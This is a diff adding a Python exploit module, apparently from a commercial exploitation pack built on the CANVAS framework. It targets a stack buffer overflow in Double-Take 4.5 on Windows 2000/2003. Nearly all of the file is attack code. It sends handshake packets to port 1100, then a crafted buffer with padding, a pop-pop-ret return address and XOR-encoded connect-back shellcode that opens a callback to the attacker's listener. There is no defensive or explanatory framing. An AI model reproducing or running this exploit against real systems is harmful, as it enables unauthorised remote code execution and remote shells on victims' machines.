@@ -1,0 +1,169 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Double-Take 4.5 Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in Double-Take 4.5"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["Versions Affected"] = "Double-Take 4.5"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['Windows 2000 SP0-SP4 / Windows 2003 SP0',  0x004eea9a],  # pop esi, pop ebp, retn @ DoubleTake.exe    
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 1100
+        self.host = ""                                
+        self.name = NAME   
+        self.badstring = "\x00"     
+        return
+        
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+				
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)
+				
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+            
+            data_1 = "\x00\x02\x00\x01\x00\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\xff\xff\xff\x40\x2c\x05\x7e"
+            data_2 = "\x00\x02\x00\x01\x00\x8d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\xff\xff\xff\x3d\xcd\x63\xc3\x6b\x89\x9b\x14\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x04\x4c\xc0\xa8\x75\x80\x00\x00\x00\x00\x00\x00\x00\x00\x04\x4c"
+            data_3 = "\x00\x02\x00\x01\x27\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\xff\xff\xff\x00\x17\x57\x69\x6e\x64\x6f\x77\x73\x20\x58\x50\x20\x50\x72\x6f\x66\x65\x73\x73\x69\x6f\x6e\x61\x6c\x00\x20\x35\x2e\x31\x20\x28\x42\x75\x69\x6c\x64\x20\x32\x36\x30\x30\x3a\x20\x53\x65\x72\x76\x69\x63\x65\x20\x50\x61\x63\x6b\x20\x32\x29\x00\x0f\x20\x34\x2e\x34\x2e\x32\x2e\x30\x2e\x31\x34\x30\x36\x2e\x53\x40\x42\x05\x7e\x00\x00\x00\x00\x03\xee\x00\x1b\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61\x6d\x20\x46\x69\x6c\x65\x73\x5c\x44\x6f\x75\x62\x6c\x65\x54\x61\x6b\x65\x00\x0a\x43\x3a\x5c\x57\x49\x4e\x44\x4f\x57\x53\x00\x00\x00\x00\x00\x02\x58\x58"
+            data_4 = "\x00\x02\x00\x01\x27\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\xff\xff\xff\x00\x17\x57\x69\x6e\x64\x6f\x77\x73\x20\x58\x50\x20\x50\x72\x6f\x66\x65\x73\x73\x69\x6f\x6e\x61\x6c\x00\x20\x35\x2e\x31\x20\x28\x42\x75\x69\x6c\x64\x20\x32\x36\x30\x30\x3a\x20\x53\x65\x72\x76\x69\x63\x65\x20\x50\x61\x63\x6b\x20\x32\x29\x00\x0f\x20\x34\x2e\x34\x2e\x32\x2e\x30\x2e\x31\x34\x30\x36\x2e\x53\x40\x42\x05\x7e\x00\x00\x00\x00\x03\xee\x00\x1b\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61\x6d\x20\x46\x69\x6c\x65\x73\x5c\x44\x6f\x75\x62\x6c\x65\x54\x61\x6b\x65\x00\x0a\x43\x3a\x5c\x57\x49\x4e\x44\x4f\x57\x53\x00\x00\x00\x00\x00\x02\x58\x58"            
+						
+            s.sendall(data_1)
+            s.recv(1024)
+            s.sendall(data_2)
+            s.recv(1024)
+            s.sendall(data_3)
+            s.recv(1024)
+            s.sendall(data_4)
+            s.recv(1024)
+            
+            s.sendall(sploitstring)            
+                        
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+                
+    def Xor(self, buff, key):
+	
+        index = 0
+        xored = ""  
+				
+        for x in range(len(buff)):
+					xored = xored + chr( ord(buff[x]) ^ ord(key[index]))	    
+					index = (index + 1) % len(key)
+									
+        return xored
+				
+    def makesploit(self):
+        """
+        Construct the attack        			  				
+				"""        																				      
+        os_name, pop_pop_ret = targets[self.version]
+				
+        data_5 = "\x00\x02\x00\x01\x27\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\xff\xff\xff\x00\x00\x00\x01\xff\xff"
+				
+        nop = "AA" * 0xbd2
+        nop2 = "\x90\x90" * 0xe32
+        jmp = "\x90\x90\xeb\x10"
+        ret = struct.pack('<L', pop_pop_ret)
+								
+        tmp = nop2[0:50]
+        tmp += self.shellcode
+        tmp += nop2[50 + len(self.shellcode):]	
+				
+        data = nop + jmp + ret + tmp
+				
+        sploitstring = data_5 + self.Xor(data, "\xF0\x00")								
+      
+        return sploitstring
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
